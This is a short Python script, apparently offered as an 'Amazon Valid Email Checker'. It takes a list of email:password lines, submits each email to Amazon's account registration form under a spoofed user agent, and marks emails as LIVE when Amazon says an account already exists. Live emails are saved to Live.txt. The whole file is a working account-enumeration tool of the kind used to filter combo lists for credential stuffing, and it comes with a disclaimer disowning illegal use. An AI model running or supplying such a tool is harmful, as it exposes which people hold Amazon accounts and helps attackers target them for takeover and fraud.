import requests
live = open('Live.txt', 'w')
Checked = "Checked by Casein Valid Email Checker"
print("_"*50)
print ("Amazon Valid Email Checker by Casein")
print("I dont't Accept any Responsibility for any illegal usage!")
print("_"*55)
list = input("Input Mail List :");
link = "https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnav_newcust&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
s = requests.session()
g = s.get(link, headers=head) #add verify=False to use a self signed certificate
#for debugging

#s.proxies = {
#   'http': 'http://127.0.0.1:8000',
#   'https': 'http://127.0.0.1:8080',
#}
list = open(list, 'r')
print("-"*55)
while True:
	email = list.readline().replace('\n','')
	if not email:
		break
	mail = email.strip().split(':')
	xxx = {'customerName':'Casein Nitrate','email': mail[0],'password':'BirdyBirdySad012','passwordCheck':'BirdyBirdySad012'}
	cek = s.post(link, headers=head, data=xxx).text #add verify=False to use a self signed certificate
	if "You indicated you're a new customer, but an account already exists with the email address" in cek:
		print("\033[32;1mLIVE\033[0m | "+email+" | [(Checked)]")
		live.write(email + '\n')
	else:
		print("\033[31;1mDIE\033[0m | "+email+" | [(Checked)]")
print("-"*50)
print("\033[35;1mProccess Checking Done\033[0m")
print("Live Email Saved in Live.txt")

